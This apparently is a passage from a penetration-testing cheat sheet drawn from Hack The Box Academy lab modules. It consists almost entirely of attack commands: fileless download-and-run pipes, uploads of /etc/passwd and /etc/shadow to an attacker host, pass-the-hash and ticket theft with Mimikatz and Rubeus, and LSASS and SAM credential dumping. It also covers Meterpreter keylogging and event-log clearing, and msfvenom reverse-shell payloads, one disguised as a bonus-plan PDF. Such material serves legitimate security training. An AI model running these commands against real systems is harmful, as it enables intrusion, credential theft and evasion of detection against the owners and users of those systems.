| `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` | Using the WebDav Python module |
| `dir \\192.168.49.128\DavWWWRoot` | Connecting to the Webdav Share -CMD |
| `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\` | Uploading Files using SMB |
| **FTP Uploads** | |
| `sudo python3 -m pyftpdlib --port 21 --write` | Starting the upload server |
| `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` | PowerShell Upload File using ftp |

### Linux File Transfer Methods

| **Command** | **Description** |
| --------------|-------------------|
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a File Using wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a File Using wget |
| `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh \| bash` | Fileless Download with cURL |
| `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py \| python3` |  Fileless Download with wget |
| | |
| **Download with Bash (/dev/tcp)** | |
| `exec 3<>/dev/tcp/10.10.10.32/80` | Connect to the Target Webserver | 
| `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3` | HTTP GET Request |
| `cat <&3` | Print the Response |
| | |
| **SSH Download / Upload** | |
| `scp plaintext@192.168.49.128:/root/myroot.txt .` | Linux - Downloading Files Using SCP |
| `scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/` | File Upload using SCP |
| | |
| **Web Upload** | |
| `python3 -m pip install --user uploadserver` | Pwnbox - Start Web Server |
| `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'` | Pwnbox - Create a Self-Signed Certificate |
| `mkdir https && cd https` | Pwnbox - Start Web Server |
| `python3 -m uploadserver 443 --server-certificate /root/server.pem` | Pwnbox - Start Web Server |
| `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure` | Linux - Upload Multiple Files |
| | |
| **Alternative Web File Transfer Method** | |
| `python3 -m http.server` | Linux - Creating a Web Server with Python3 |
| `python2.7 -m SimpleHTTPServer` | Linux - Creating a Web Server with Python2.7 |
| `php -S 0.0.0.0:8000` | Linux - Creating a Web Server with PHP |
| `ruby -run -ehttpd . -p8000` | Linux - Creating a Web Server with Ruby |
| `wget 192.168.49.128:8000/filetotransfer.txt` | Download the File from the Target Machine onto the Pwnbox |

### Transfering Files with Code

| **Command** | **Description** |
| --------------|-------------------|
| **Python** | |
| `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` | Python 2 - Download |
| `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` | Python 3 - Download |
| `python3 -m uploadserver` | Starting the Python uploadserver Module |
| `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'` | Uploading a File Using a Python One-liner |
| | |
| **PHP** | |
| `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | PHP Download with File_get_contents() |
| `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'` | PHP Download with Fopen() |
| `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' \| bash` | PHP Download a File and Pipe it to Bash |
| | |
| **Other Languages** | |
| `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'` | Ruby - Download a File |
| `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'` | Perl - Download a File |
| `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1` | Download a File Using JavaScript and cscript.exe -CMD |

#### CSCRIPT.exe [JS]
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
#### OR [VBSCRIPT]

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Miscellaneous File Transfer Methods


| **Command** | **Description** |
| --------------|-------------------|
| **File Transfer with Netcat and Ncat** | |
| `nc -l -p 8000 > SharpKatz.exe` |  NetCat - Compromised Machine - Listening on Port 8000 |
| `ncat -l -p 8000 --recv-only > SharpKatz.exe` | Ncat - Compromised Machine - Listening on Port 8000 |
| `nc -q 0 192.168.49.128 8000 < SharpKatz.exe` | Netcat - Attack Host - Sending File to Compromised machine |
| `ncat --send-only 192.168.49.128 8000 < SharpKatz.exe` | Ncat - Attack Host - Sending File to Compromised machine |
| `sudo nc -l -p 443 -q 0 < SharpKatz.exe` | Attack Host - Sending File as Input to Netcat |
| `nc 192.168.49.128 443 > SharpKatz.exe` | Compromised Machine Connect to Netcat to Receive the File |
| `sudo ncat -l -p 443 --send-only < SharpKatz.exe` | Attack Host - Sending File as Input to Ncat |
| `ncat 192.168.49.128 443 --recv-only > SharpKatz.exe` | Compromised Machine Connect to Ncat to Receive the File |
| `cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe` | If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/, Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File |
| | |
| [PowerShell Session File Transfer](https://academy.hackthebox.com/module/24/section/161) | |
| | |
| **RDP** | |
| `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer` | Mounting a Linux Folder Using xfreerdp- To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session. |

### File Encryption on Windows 

| **Command** | **Description** |
| --------------|------------------- |
| **File Encryption on Windows** | |
| `Import-Module .\Invoke-AESEncryption.ps1` | Import Module Invoke-AESEncryption.ps1 -PWSH |
| `Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt` | File Encryption Example -PWSH |
| | |
| **File Encryption on Linux** | |
| `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc` | Encrypting /etc/passwd with openssl |
| `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd` | Decrypt passwd.enc with openssl |

### [Catching Files over HTTP/S](https://academy.hackthebox.com/module/24/section/681)

### [Living off The Land]

##### [LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins](https://gtfobins.github.io/) for Linux are websites where we can search for binaries we can use for different functions.

| **Command** | **Description** |
| --------------|------------------- |
| `certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini` | Upload win.ini to our Pwnbox -CMD |
| `sudo nc -lvnp 80` | File Received in our Netcat Session |
| `GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe" `| Transfer file with GfxDownloadWrapper.exe|
| | |
| **OPENSSL** |  |
| `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem` | Create Certificate in our Pwnbox |
| `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh` | Stand up the Server in our Pwnbox |
| `$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome & Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`|Download via Chrome user Agent|
| `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh` | Download File from the Compromised Machine |
| | |
| **Other Common Living off the Land tools Powershell** | |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | File Download with Bitsadmin |
| `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"` | PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers. DOWNLOAD |
| `Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql` | UPLOAD |
| | |
| **Certutil** |  Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage. |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a File with Certutil -CMD |

------

## GIT

### Download .git 

```
mkdir <DESTINATION_FOLDER>
./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
```

### Extract .git content

```
mkdir <EXTRACT_FOLDER>
./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>
```

------

## HASHES

### Pass the hash
```
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::
```

## CRACK MAP EXEC
```
crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H <NTLM Hash> --local-auth # Check other machines for dual access with the same hash; --sam (dump SAM file)

crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -p <P@ssw0rd1>

```
## PSEXEC
```
psexec.py "frank castle":@192.168.68.122 -hashes aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 # attempt to gain a shell
```
-----
## Pth-Winexe
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
```

##Evil-Winrm
```
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

evil-winrm  -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```
----

## Impacket-PSexec:
```
python3 /usr/share/impacket/impacket/examples/psexec.py "Administrator":@10.11.1.121 -hashes aad3b435b51404eeaad3b435b51404ee:57321e6a0eef2c45985c9fa49c5cd24f 
```

### Pass the Hash (PtH) 

| **Command**| **Description**|
|-|-|
| `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit` | Pass the Hash from Windows Using Mimikatz -CMD |
| [Invoke-TheHash with SMB / Invoke-TheHash with WMI](https://academy.hackthebox.com/module/147/section/1638) | |
| `impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453` | Pass the Hash with Impacket psexec (Linux) |
| `crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453` | Pass the Hash with CrackMapExec |
| `crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami` | Pass the Hash command execution with CrackMapExec |
| `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453` | Pass the Hash with evil-winrm |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable Restricted Admin Mode to Allow PtH from xfreerdp -CMD |
| `xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B` | Pass the Hash Using RDP |

### Pass the Ticket (PtT) from Windows 

| **Command**| **Description**|
|-|-|
| **Mimikatz - Export Tickets** | Command Prompt |
| `mimikatz.exe` | |
| `privilege::debug` | |
| `sekurlsa::tickets /export` | |
| | |
| **Rubeus - Export Tickets** | Command Prompt |
| `Rubeus.exe dump /nowrap` | |
| | | 
| **Pass the Key or OverPass the Hash** | |
| Mimikatz - Extract Kerberos Keys | Command Prompt |
| `mimikatz.exe` | |
| `privilege::debug` | |
| `sekurlsa::ekeys` | |
| | |
| Mimikatz - Extract Kerberos Keys | |
| `mimikatz.exe` | |
| `privilege::debug` | |
| `sekurlsa::ekeys` | |
| | |
| Mimikatz - Pass the Key or OverPass the Hash | |
| `mimikatz.exe` | |
| `privilege::debug` | |
| `sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f` | |
| Rubeus - Pass the Key or OverPass the Hash | |
| `Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap` | |
| [Pass the ticket from windows](https://academy.hackthebox.com/module/147/section/1639) | [Pass The ticket from linux](https://academy.hackthebox.com/module/147/section/1657) |

### Windows

```
reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM > hashes
```

### Linux

```
unshadow passwd shadow > hashes
```

------

## MIMIKATZ

```
privilege::debug
```

```
sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache
```

------

## MISCELLANEOUS

### Get a Windows path without spaces


```
# path.cmd
@echo off
echo %~s1

path.cmd "C:\Program Files (x86)\Common Files\test.txt"
C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
```

------

# Using the Metasploit Framework

### MSFconsole Commands 

| **Command**        | **Description**        |
| :--------------- | :----------------------------------------------------------- |
| `show exploits` | Show all exploits within the Framework.                      |
| `show payloads`  | Show all payloads within the Framework.                      |
| `show auxiliary` | Show all auxiliary modules within the Framework.             |
| `search <name>` | Search for exploits or modules within the Framework.         |
| `info`         | Load information about a specific exploit or module.         |
| `use <name>` | Load an exploit or module (example: use windows/smb/psexec). |
| `use <number>` | Load an exploit by using the index number displayed after the search <name> command. |
| `LHOST`        | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
| `RHOST`        | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). |
| `setg <function>` | Set a specific value globally (for example, LHOST or RHOST). |
| `show options` | Show the options available for a module or exploit.          |
| `show targets` | Show the platforms supported by the exploit.                 |
| `set target <number>` | Specify a specific target index if you know the OS and service pack. |
| `set payload <payload>` | Specify the payload to use. |
| `set payload <number>` | Specify the payload index number to use after the show payloads command. |
| `show advanced` | Show advanced options. |
| `set autorunscript migrate -f` | Automatically migrate to a separate process upon exploit completion. |
| `check` | Determine whether a target is vulnerable to an attack. |
| `exploit` | Execute the module or exploit and attack the target. |
| `exploit -j` | Run the exploit under the context of the job. (This will run the exploit in the background.) |
| `exploit -z` | Do not interact with the session after successful exploitation. |
| `exploit -e <encoder>` | Specify the payload encoder to use (example: exploit –e shikata_ga_nai). |
| `exploit -h` | Display help for the exploit command. |
| `sessions -l` | List available sessions (used when handling multiple shells). |
| `sessions -l -v` | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. |
| `sessions -s <script>` | Run a specific Meterpreter script on all Meterpreter live sessions. |
| `sessions -K` | Kill all live sessions. |
| `sessions -c <cmd>` | Execute a command on all live Meterpreter sessions. |
| `sessions -u <sessionID>` | Upgrade a normal Win32 shell to a Meterpreter console. |
| `db_create <name>` | Create a database to use with database-driven attacks (example: db_create autopwn). |
| `db_connect <name>` | Create and connect to a database for driven attacks (example: db_connect autopwn). |
| `db_nmap` | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.) |
| `db_destroy` | Delete the current database. |
| `db_destroy  <user:password@host:port/database>` | Delete database using advanced options. |

### Meterpreter Commands 

| **Command**           | **Description**        |
| :---------------------------------------------------------- | :----------------------------------------------------------- |
| `help`            | Open Meterpreter usage help.                                 |
| `run <scriptname>`                                        | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. |
| `sysinfo`         | Show the system information on the compromised target.       |
| `ls`              | List the files and folders on the target.                    |
| `use priv`        | Load the privilege extension for extended Meterpreter libraries. |
| `ps`              | Show all running processes and which accounts are associated with each process. |
| `migrate <proc. id>`                                      | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
| `use incognito`   | Load incognito functions. (Used for token stealing and impersonation on a target machine.) |
| `list_tokens -u`  | List available tokens on the target by user.                 |
| `list_tokens -g`  | List available tokens on the target by group.                |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`               | Impersonate a token available on the target.                 |
| `steal_token <proc. id>`                                  | Steal the tokens available for a given process and impersonate that token. |
| `drop_token`      | Stop impersonating the current token.                        |
| `getsystem`       | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors. |
| `shell`           | Drop into an interactive shell with all available tokens.    |
| `execute -f <cmd.exe> -i`                                 | Execute cmd.exe and interact with it.                        |
| `execute -f <cmd.exe> -i -t`                              | Execute cmd.exe with all available tokens.                   |
| `execute -f <cmd.exe> -i -H -t`                           | Execute cmd.exe with all available tokens and make it a hidden process. |
| `rev2self`        | Revert back to the original user you used to compromise the target. |
| `reg <command>` | Interact, create, delete, query, set, and much more in the target’s registry. |
| `setdesktop <number>`                                     | Switch to a different screen based on who is logged in.      |
| `screenshot`      | Take a screenshot of the target’s screen.                    |
| `upload <filename>`                                       | Upload a file to the target.                                 |
| `download <filename>`                                     | Download a file from the target.                             |
| `keyscan_start`   | Start sniffing keystrokes on the remote target.              |
| `keyscan_dump`    | Dump the remote keys captured on the target.                 |
| `keyscan_stop`    | Stop sniffing keystrokes on the remote target.               |
| `getprivs`        | Get as many privileges as possible on the target.            |
| `uictl enable <keyboard/mouse>`                           | Take control of the keyboard and/or mouse.                   |
| `background`      | Run your current Meterpreter shell in the background.        |
| `hashdump`        | Dump all hashes on the target. use sniffer Load the sniffer module. |
| `sniffer_interfaces`                                        | List the available interfaces on the target.                 |
| `sniffer_dump <interfaceID> pcapname`                     | Start sniffing on the remote target.                         |
| `sniffer_start <interfaceID> packet-buffer`               | Start sniffing with a specific range for a packet buffer.    |
| `sniffer_stats <interfaceID>`                             | Grab statistical information from the interface you are sniffing. |
| `sniffer_stop <interfaceID>`                              | Stop the sniffer.  |
| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                             |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target. |
| `clearev`         | Clear the event log on the target machine.                   |
| `timestomp`       | Change file attributes, such as creation date (antiforensics measure). |
| `reboot`          | Reboot the target machine.                                   |

-----
### Crafting Payloads with MSFvenom

|**Commands** |**Description**|
|---|---|
| `msfvenom -l payloads` | List Payloads |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf` | Let's build a simple linux stageless payload with msfvenom |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe` | We can also use msfvenom to craft an executable (.exe) file that can be run on a Windows system to provide a shell. |
| `sudo nc -lvnp 443` | Listener |
| | |
| **Metasploit** | |
| `use exploit/windows/smb/psexec` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |
| `shell` | Command used in a meterpreter shell session to drop into a `system shell` |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload` |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | MSFvenom command used to generate a Windows-based reverse shell stageless payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | MSFvenom command used to generate a MacOS-based reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | MSFvenom command used to generate a JSP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |

------

# Password Attacks

### Connecting to Target

| **Command**| **Description**|
|-|-|
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `evil-winrm -i <ip> -u user -p password`            | Uses Evil-WinRM to establish a Powershell session with a target. |
| `ssh user@<ip>`                                     | Uses SSH to connect to a target using a specified user.      |
| `smbclient -U user \\\\<ip>\\SHARENAME`             | Uses smbclient to connect to an SMB share using a specified user. |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

### Password Mutations

| **Command**| **Description**|
|-|-|
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Uses cewl to generate a wordlist based on keywords present on a website. |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list` | Uses Hashcat to generate a rule-based word list.             |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt` | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. |
| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |

### Password Reuse / Default Passwords

| **Command**| **Description**|
|-|-|
| **Credential Stuffing** | |
| [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) | For Credential Stuffing |
| `hydra -C <user_pass.list> <protocol>://<IP>` | Credential Stuffing - Hydra Syntax |
| [Router Default Creds](https://www.softwaretestinghelp.com/default-router-username-and-password-list/) | |

### Remote Password Attacks

| **Command**| **Description**|
|-|-|
| `crackmapexec winrm <ip> -u user.list -p password.list` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target. |
| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. |
| `hydra -L user.list -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |
| `hydra -l username -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |
| `hydra -l user.list -p password <service>://<ip>`       | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |
| `hydra -C <user_pass.list> ssh://<IP>`                       | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds` | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. |
| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"` | Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack. |

### Attacking SAM

| **Command**| **Description**|
|-|-|
| hklm\sam |	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| hklm\system |	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |
| hklm\security |	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |

| **Using reg.exe save to Copy Registry Hives** | **Description** |
|-|-|
| ` reg.exe save hklm\sam C:\sam.save` | Command Prompt |
| ` reg.exe save hklm\system C:\system.save` | Command Prompt |
| ` reg.exe save hklm\security C:\security.save` | Command Prompt |
| ` sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/` | Creating a Share with smbserver.py |
| ` move sam.save \\10.10.15.16\CompData` | Moving Hive Copies to Share -CMD |
| ` move security.save \\10.10.15.16\CompData` | Moving Hive Copies to Share -CMD |
| ` move system.save \\10.10.15.16\CompData` | Moving Hive Copies to Share -CMD |
| ` locate secretsdump` | One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. |
| ` python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Running secretsdump.py to dump hashes from hive copies |
| ` sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt` | Cracking nt hash using hashcat |
| ` crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa` |

### Windows Local Password Attacks

| **Command**| **Description**|
|-|-|
| Task Manager Method | Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file *A file called lsass.DMP is created and saved in:* `C:\Users\loggedonusersdirectory\AppData\Local\Temp` |
| | |
| `tasklist /svc`    | A command-line-based utility in Windows used to list running processes. |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` | Uses Windows command-line based utility findstr to search for the string "password" in many different file type. |
| `Get-Process lsass`| A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. |
| `pypykatz lsa minidump /path/to/lsassdumpfile`               | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. |
| `reg.exe save hklm\sam C:\sam.save`                          | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
| `move sam.save \\<ip>\NameofFileShare`                  | Uses move in Windows to transfer a file to a specified file share over the network. |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Uses Secretsdump.py to dump password hashes from the SAM database. |
| `vssadmin CREATE SHADOW /For=C:`                             | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. |
| `crackmapexec smb IP -u administrator -p pass -M lsassy ` (Need --local-auth if user is local account) | Dump LSASS using Lsassy module remotely|
|` crackmapexec smb 192.168.255.131 -u administrator -p pass -M nanodump`| Dump LSASS using nanodump module|
| | |
| `./username-anarchy -i /home/ltnbob/names.txt` | Creating a Custom list of Usernames |
| `start lazagne.exe all` | We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/) to quickly discover credentials that web browsers or other installed applications may insecurely store. -CMD |

## Linux Local Password Attacks

| **Command**| **Description**|
|-|-|
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script that can be used to find .conf, .config and .cnf files on a Linux system.|
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done` | Script that can be used to find credentials in specified file types. |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done` | Script that can be used to find common database files.|
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`| Uses Linux-based find command to search for text files.|
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done` | Script that can be used to search for common file types used with scripts. |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script used to look for common types of documents.|
| `cat /etc/crontab`| Uses Linux-based cat command to view the contents of crontab in search for credentials. |
| `ls -la /etc/cron.*/`| Uses Linux-based  ls -la command to list all files that start with `cron` contained in the etc directory. |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`| Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys. |
